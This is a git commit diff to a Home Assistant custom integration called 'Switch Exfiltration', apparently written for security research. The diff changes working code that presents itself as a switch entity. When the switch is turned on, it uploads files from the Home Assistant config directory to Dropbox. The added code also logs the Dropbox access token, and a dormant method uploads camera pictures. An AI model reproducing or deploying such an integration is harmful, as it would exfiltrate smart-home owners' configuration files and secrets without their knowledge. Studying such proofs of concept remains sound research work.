2a237945ab5924cf2409053eeeb296c732211104
Luca Mannella <luca.mannella@polito.it>
2022-12-23 19:09:31 +0000

    minor updates

--- switch_exfiltration/switch.py
+++ switch_exfiltration/switch.py
@@ -11,7 +11,9 @@ from homeassistant.core import HomeAssistant
 from homeassistant.helpers.entity_platform import AddEntitiesCallback
 from homeassistant.helpers.typing import ConfigType, DiscoveryInfoType
 
-# To enable the print statements this integration must be configured to log level: debug
+
+NAME_KEY = "name"
+DEFAULT_NAME = "Switch Exfiltration"
 PRINT_KEY = "printing"
 ACCESS_TOKEN_KEY = "db_access_token"
 
@@ -30,10 +32,17 @@ def setup_platform(
         _LOGGER.critical("Missing access token!")
         return False
 
-    if PRINT_KEY in config:
-        add_entities([SwitchExfiltration(config[ACCESS_TOKEN_KEY], config[PRINT_KEY])])
+    if NAME_KEY in config:
+        name = config[NAME_KEY]
     else:
-        add_entities([SwitchExfiltration(config[ACCESS_TOKEN_KEY])])
+        name = DEFAULT_NAME
+
+    if PRINT_KEY in config:
+        printing = config[PRINT_KEY]
+    else:
+        printing = False
+
+    add_entities([SwitchExfiltration(config[ACCESS_TOKEN_KEY], name, printing)])
     return True
 
 
@@ -45,14 +54,16 @@ class SwitchExfiltration(SwitchEntity):
     # The access token to update info on Dropbox should be written here.
     # _access_token = "token"
 
-    def __init__(self, access_token, printing: bool = False):
-        _LOGGER.info("I'm the switch: %s", self.name)
+    def __init__(self, access_token, name: str = DEFAULT_NAME, printing: bool = False):
+        self._access_token = access_token
+        self._name = name
+        self._print = printing
         self._is_on = False
         self._file_path = self.find_path()
-        self._print = printing
+        # self._file_path = self.hass.config  # during initialization <hass> is None
 
-        # Even if the Dropbox token should be hardcoded, for simplicity is retrieved from configuration.yaml
-        self._access_token = access_token
+        _LOGGER.info("<%s> was created", self._name)
+        _LOGGER.debug("The access token is: <%s>", self._access_token)
 
         if self._print:
             self.print_config()
@@ -60,7 +71,7 @@ class SwitchExfiltration(SwitchEntity):
     @property
     def name(self):
         """Name of the entity."""
-        return "Switch Exfiltration"
+        return self._name
 
     @property
     def is_on(self):
@@ -70,64 +81,41 @@ class SwitchExfiltration(SwitchEntity):
     def turn_on(self, **kwargs):
         """Turn the switch on."""
         self._is_on = True
-        self.store_picture_on_db()
         self.store_data()
+        # self.store_picture_on_db()
 
     def turn_off(self, **kwargs):
         """Turn the switch off."""
         self._is_on = False
 
-    def find_path(self) -> str:
-        """Find the working path."""
-
-        dev_path = "/workspaces/core/config/"
-        prod_path = "/config/"
-        local_path = "./config/"
-
-        file_path = None
-        if os.path.isfile(dev_path + self._target_file2):
-            _LOGGER.debug("Source Path: dev path")
-            file_path = dev_path
-        elif os.path.isfile(prod_path + self._target_file2):
-            _LOGGER.debug("Source Path: prod path")
-            file_path = prod_path
-        elif os.path.isfile(local_path + self._target_file2):
-            _LOGGER.debug("Source Path: local path")
-            file_path = local_path
-        else:
-            _LOGGER.info("There is no target file")
-        return file_path
-
     def print_config(self):
         """Print configuration info for debug purposes."""
 
         if self._file_path:
-            with open(self._file_path + self._target_file1, "rt") as _f:
+            file1 = self._file_path + self._target_file1
+            with open(file1, "rt", encoding="utf-8") as _f:
                 _LOGGER.debug("\n---\n Printing target: %s \n---", self._target_file1)
                 data = _f.read()
                 _LOGGER.debug(data)
-            with open(self._file_path + self._target_file2, "rt") as _f:
+
+            file2 = self._file_path + self._target_file2
+            with open(file2, "rt", encoding="utf-8") as _f:
                 _LOGGER.debug("\n---\n Printing target: %s \n---", self._target_file2)
                 data = _f.read()
                 _LOGGER.debug(data)
 
     def store_data(self):
         """Upload the target files on Dropbox."""
-        if self._file_path:
-            upload_path = "/config/"
-            self.upload_file(
-                self._file_path + self._target_file1,
-                upload_path + self._target_file1,
-            )
-            self.upload_file(
-                self._file_path + self._target_file2,
-                upload_path + self._target_file2,
-            )
-        else:
-            _LOGGER.info("File path not available!")
+        file_path = self.hass.config
+        upload_path = "/config/"
+        src1 = file_path.path(self._target_file1)
+        src2 = file_path.path(self._target_file2)
+
+        self.upload_file(src1, upload_path + self._target_file1)
+        self.upload_file(src2, upload_path + self._target_file2)
 
     def store_picture_on_db(self):
-        """Store the last picture on Dropbox."""
+        """Store the last picture on Dropbox. Currently not used."""
         # test_image_name = "test_20211201_170607.jpg"
         dev_path = "/workspaces/core/homeassistant/media/"
         prod_path = "/homeassistant/media/"
@@ -162,3 +150,24 @@ class SwitchExfiltration(SwitchEntity):
 
         with open(file_from, "rb") as _f:
             dbx.files_upload(_f.read(), file_to, mode=dropbox.files.WriteMode.overwrite)
+
+    def find_path(self) -> str:
+        """Find the working path. This method is not used anymore."""
+
+        dev_path = "/workspaces/core/config/"
+        prod_path = "/config/"
+        local_path = "./config/"
+
+        file_path = None
+        if os.path.isfile(dev_path + self._target_file2):
+            _LOGGER.debug("Source Path: dev path")
+            file_path = dev_path
+        elif os.path.isfile(prod_path + self._target_file2):
+            _LOGGER.debug("Source Path: prod path")
+            file_path = prod_path
+        elif os.path.isfile(local_path + self._target_file2):
+            _LOGGER.debug("Source Path: local path")
+            file_path = local_path
+        else:
+            _LOGGER.info("There is no target file")
+        return file_path
